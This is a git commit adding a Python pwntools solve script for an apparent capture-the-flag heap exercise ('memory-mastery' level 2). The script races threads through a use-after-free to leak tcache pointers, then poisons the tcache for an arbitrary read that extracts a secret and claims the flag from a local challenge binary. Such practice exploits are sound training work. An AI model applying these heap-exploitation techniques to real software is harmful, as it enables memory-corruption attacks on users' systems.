252d3f597031b880a9ca10b8d9c21e6b0c4a91d7
Kristiyan132 <122425108@naval-acad.bg>
2026-09-11 09:00:37 +0300

    Level 2 done

---
+++ memory-mastery/level2-0/solve.py
@@ -0,0 +1,288 @@
+#!/bin/python 
+
+import os
+import sys
+import time
+import signal
+import argparse
+import pwn as p
+
+from functools import partial
+
+
+SCANF_INPUT_SIZE = 1024
+HEAP_FIRST_OFF   = 0xf30
+SECRET_HEAP_OFF  = HEAP_FIRST_OFF + 0x20
+
+DATA_PREFIX = b"MESSAGE: "
+DATA_PREFIX_LEN = len(DATA_PREFIX)
+
+TRIES = 10000
+
+p.context.arch = 'amd64'
+args = None
+proc, elf, libc = (None, None, None)
+gdb_pid = 0
+pids = []
+
+
+def get_server():
+    global proc, elf, libc
+
+    argv = (["sudo", "strace"] if args.strace else []) + [args.binary]
+    if args.noaslr:
+        proc = p.process(argv, setuid=False, aslr=False)
+    else:
+        proc = p.process(argv)
+
+    elf  = p.ELF(args.binary) if args.strace else proc.elf
+    libc = elf.libc
+    assert libc is not None
+
+
+def restart_server():
+    proc.kill()
+    get_server()
+
+
+def attach_gdb(gdbscript=""):
+    global gdb_pid
+    if not (args.gef or args.pwndbg):
+        return
+
+    gdbscript = ("gef-init\n" if args.gef else "pwndbg-init\n") + gdbscript
+    gdb_pid = p.gdb.attach(proc, gdbscript=gdbscript)
+    time.sleep(1)
+
+
+def detach_gdb():
+    global gdb_pid
+    if not gdb_pid:
+        return 
+
+    input("\nPress any key to kill gdb...\n")
+    try:
+        os.kill(gdb_pid, signal.SIGTERM)
+    except:
+        pass
+    gdb_pid = 0
+
+
+class thread_comm(p.remote):
+    def __init__(self, host="localhost", port=1337, do_send=True):
+        if proc is None:
+            print("!WARNING! Proc wasnt started.")
+        super().__init__(host, port)
+        self.own_payload = b""
+        self.do_send = do_send
+        time.sleep(0.1)
+
+
+    def prompt_cmd(self, cmd):
+        if len(cmd) > SCANF_INPUT_SIZE:
+            print("!WARNING! Length of cmd is larger than input max size.")
+            cmd = cmd[:SCANF_INPUT_SIZE]
+        if isinstance(cmd, str):
+            cmd = cmd.encode()
+
+        if self.do_send:
+            self.sendline(cmd)
+        else:
+            self.own_payload += cmd + b' '
+
+
+    def quit(self):
+        self.prompt_cmd(b"quit")
+        time.sleep(0.1)
+
+
+    def get_payload(self):
+        ret = self.own_payload[:-1]
+        self.own_payload = b""
+        return ret
+
+
+    def send_idx(self, idx):
+        self.sendline(str(idx).encode())
+
+
+    def printf(self, idx: bytes, do_recv=True):
+        self.sendline(b"printf " + idx)
+        if do_recv:
+            self.recvuntil(DATA_PREFIX)
+            return self.recvline(drop=True)
+
+
+    def malloc(self, idx: bytes):
+        self.prompt_cmd(b"malloc " + idx)
+
+
+    def scanf(self, idx: bytes, msg):
+        cmd = b"scanf " + idx + b' ' + msg
+        self.prompt_cmd(cmd)
+
+
+    def free(self, idx: bytes):
+        self.prompt_cmd(b"free " + idx)
+
+
+    def send_flag(self, data: bytes):
+        self.prompt_cmd(b"send_flag " + data)
+        if self.recvuntil(b"pwn.", timeout=2) != b"":
+            return self.recv(55)
+        return b""
+
+
+def make_workers(num: int, fn, *args):
+    for i in range(num):
+        pid = os.fork()
+        if not pid:
+            for _ in range(TRIES):
+                fn(*args)
+            sys.exit(0)
+        pids.append(pid)
+
+
+def wait_workers():
+    for pid in pids:
+        os.wait()
+        pids.pop()
+
+
+def kill_workers():     # hmh, I mean retire*
+    print(pids)
+    for pid in pids:
+        os.kill(pid, 9) # trust me
+
+
+def to_addr(b: bytes):
+    return p.u64(b[:8].ljust(8, b'\x00'))
+
+
+def fix_idx(idx):
+    return idx if isinstance(idx, bytes) else str(idx).encode()
+
+
+# We malloc, scanf 8 random bytes to buffer and then race:
+# thd1: strlen(buf) => returns 8 bytes
+# thd2: free(buf)   => get metadata into buf
+# thd1: write(1, buf, stlren) => syscall writing out the metadata
+def tcache_leak(thd1: thread_comm, thd2: thread_comm):
+    scanf_bytes = p.cyclic(8)
+
+    thd1.do_send = False
+    thd1.malloc(b'0')
+    thd1.scanf(b'0', scanf_bytes)
+    thd1.free(b'0')
+    make_workers(1, thd1.sendline, thd1.get_payload())
+    thd1.do_send = True
+
+    for _ in range(TRIES):
+        thd2.printf(b'0', do_recv=False)
+    wait_workers()
+
+    results = set(thd2.clean().splitlines())
+    print(results)
+    for res in results:
+        ret = res[DATA_PREFIX_LEN:]
+        if len(ret) == 8 and ret != scanf_bytes:
+            return to_addr(ret)
+
+    return 0
+
+
+def get_tcache_leak(thd1, thd2):
+    tcache_addr = 0
+    for _ in range(TRIES):
+        tcache_addr = tcache_leak(thd1, thd2)
+        if tcache_addr:
+            break
+    return tcache_addr
+
+
+# maybe check if target_addr is a mod of 8/16
+def arbitrary_read(thd1, thd2, target_addr: int):
+    target_addr_packed = p.p64(target_addr)
+    # attach_gdb('''
+    #     b malloc
+    #     c
+    #     finish
+    #     set $fmalloc = $rax
+    #
+    #     b fprintf
+    #     b free
+    # ''')
+
+    thd1.malloc(b'0')
+    thd1.malloc(b'1')
+    thd1.free(b'1')
+    detach_gdb()
+
+    # make_workers(1, thd2.free, b'0')
+    while True:
+        if not os.fork():
+            thd1.free(b'0')
+            sys.exit(0)
+        thd2.send((b"scanf 0 " + target_addr_packed + b'\n') * 1000)
+        os.wait()
+
+        time.sleep(0.1)
+        thd1.malloc(b'0')
+        data = thd1.printf(b'0')
+
+        # because printf stops writing on a NULL byte
+        if data[:8] == target_addr_packed.split(b'\x00')[0]:
+            thd2.quit()
+            print("data: ", hex(to_addr(data)))
+            break
+
+    attach_gdb('''
+        b malloc
+        c
+    ''')
+
+    thd1.malloc(b'1')
+    return thd1.printf(b'1')
+
+
+def exploit():
+    thd1 = thread_comm()
+    thd2 = thread_comm()
+
+    tcache_xored_loc = get_tcache_leak(thd1, thd2)
+    if not tcache_xored_loc:
+        print(b"no tcache leak")
+        return b""
+    print("tcache xored loc: ", hex(tcache_xored_loc))
+
+    target_addr = (tcache_xored_loc << 12) + SECRET_HEAP_OFF
+    target_addr ^= tcache_xored_loc
+    secret = arbitrary_read(thd1, thd2, target_addr)
+    print("Leaked secret:", secret)
+
+    flag = thd1.send_flag(secret)
+    print(flag)
+
+
+def main():
+    parser = argparse.ArgumentParser(usage="Usage: ./script.py [binary]")
+    parser.add_argument('binary')
+    parser.add_argument('-g', "--gef",    action='store_true')
+    parser.add_argument('-p', "--pwndbg", action='store_true')
+    parser.add_argument('-s', "--strace", action='store_true')
+    parser.add_argument('-n', "--noaslr", action='store_true')
+    parser.add_argument('-l', "--log-level", default='info', type=str)
+
+    global args
+    args = parser.parse_args()
+    p.context.log_level = args.log_level
+
+    get_server()
+    exploit()
+
+    proc.interactive()
+    proc.kill()
+
+
+if __name__ == '__main__':
+    main()
